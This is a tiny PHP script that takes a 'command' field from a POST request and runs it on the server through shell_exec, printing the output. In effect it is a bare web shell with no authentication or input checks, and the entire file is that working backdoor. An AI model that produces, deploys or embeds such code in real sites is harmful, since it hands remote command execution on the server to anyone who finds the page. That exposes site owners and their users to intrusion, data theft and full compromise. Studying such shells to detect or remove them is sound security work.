<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // collect value of input field
    $cmd = $_POST['command'];
    if (empty($cmd)) {
        echo "NILL";
    } else {
        echo shell_exec($cmd);
    }
}
?>